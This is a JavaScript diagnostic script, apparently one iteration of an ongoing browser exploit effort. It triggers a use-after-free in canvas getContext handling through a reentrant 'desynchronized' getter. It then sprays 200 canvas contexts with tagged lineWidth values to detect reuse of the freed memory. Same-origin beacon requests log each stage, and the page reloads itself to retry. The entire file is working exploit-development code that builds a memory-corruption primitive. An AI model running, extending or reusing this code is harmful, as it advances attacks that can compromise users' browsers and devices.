// p486 — Diagnostic: pinpoint WHERE second UAF crashes
//
// V485 crashed after UAF1-ALIAS with no further beacons.
// Need to determine if crash is:
//   A) During second UAF trigger (outer getContext frees C1_2, wrapping C2_2 triggers GC)
//   B) During freed-memory read (dCtx2.lineWidth follows stale m_stateStack)
//   C) Something else between UAF1-ALIAS and UAF2 setup
//
// Strategy: add beacons at each stage. Beacon XHRs are safe BEFORE C1_2 is freed.
// After C1_2 is freed, the ONLY things we do are raw double reads (no allocation).
//
// Beacon prefix: V486-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V486-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: First UAF → same-type spray (proven working from V482)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);
  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  var sprayC1 = [], sprayX1 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC1.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 100 + i;
    sprayX1.push(ctx);
  }

  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 100 || lw1 >= 300) {
    B('UAF1-MISS', 'lw=' + lw1); return;
  }
  var idx1 = Math.round(lw1 - 100);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Diagnostic second UAF with step-by-step beacons
  // ═══════════════════════════════════════════════════════════

  // Step A: setup (safe — no freed memory yet)
  var dCtx2 = null, lCtx2 = null;
  var tc2 = document.createElement('canvas');
  tc2.width = 10; tc2.height = 10;
  document.body.appendChild(tc2);
  B('STEP-A', 'tc2 created+appended');

  // Step B: define settings with getter that sends beacon INSIDE
  var cc2 = 0, s2 = {};
  Object.defineProperty(s2, 'desynchronized', {
    get: function() {
      cc2++;
      if (cc2 === 1) {
        dCtx2 = tc2.getContext('2d');
        // C1_2 is ALIVE here — safe to beacon
        B('STEP-B', 'inner-ctx-created,cc2=' + cc2);
      }
      return false;
    }
  });
  B('STEP-C', 'settings defined');

  // Step D: trigger second UAF
  // After this call:
  //   - Inner getContext created C1_2 (getter ran)
  //   - Outer getContext created C2_2
  //   - unique_ptr assignment freed C1_2
  //   - lCtx2 = C2_2 wrapper
  //   - dCtx2 = C1_2 wrapper (DANGLING)
  //
  // The wrapping of C2_2 in MarkedSpace might trigger GC.
  // GC would visit dCtx2's wrapper → isReachableFromOpaqueRoots or visitAdditionalChildren
  // → wrapped().canvas() → follows freed C1_2's m_canvas at +32
  // m_canvas should still point to tc2 (stale but valid) if allocator only touched bytes 0-7

  // Pre-allocate result var
  var r_lw = -999;

  lCtx2 = tc2.getContext('2d', s2);  // UAF TRIGGER

  // ─── ZERO-ALLOCATION ZONE ──────────────────────────────
  // ONE read only. No XHR, no object creation.
  if (dCtx2) {
    r_lw = dCtx2.lineWidth;
  }
  // ─── END ZERO-ALLOCATION ZONE ──────────────────────────

  // Step E: send read result
  B('STEP-D', 'trigger returned, dCtx2=' + !!dCtx2 + ',lCtx2=' + !!lCtx2);
  B('STEP-E', 'lw=' + r_lw);

  // Step F: verify it's actually freed (spray into second slot)
  var sprayC2 = [], sprayX2 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC2.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX2.push(ctx);
  }

  var lw2 = dCtx2.lineWidth;
  if (lw2 >= 500 && lw2 < 700) {
    var idx2 = Math.round(lw2 - 500);
    B('UAF2-ALIAS', 'idx=' + idx2 + ',prev_lw=' + r_lw);
  } else {
    B('UAF2-NOSPRAY', 'lw=' + lw2 + ',prev_lw=' + r_lw);
  }

  // Step G: additional diagnostic — what getContext type is lCtx2?
  B('STEP-G', 'lCtx2.canvas===tc2:' + (lCtx2.canvas === tc2) + ',dCtx2.canvas===tc2:' + (dCtx2.canvas === tc2));

  // Step H: check if dCtx1 still aliases
  var lw1_check = dCtx1.lineWidth;
  B('STEP-H', 'uaf1 re-check lw=' + lw1_check + ',expected=' + (100 + idx1));

  B('DONE', 'all steps completed');

  // Auto-refresh after 8s
  setTimeout(function() { location.reload(); }, 8000);
})();
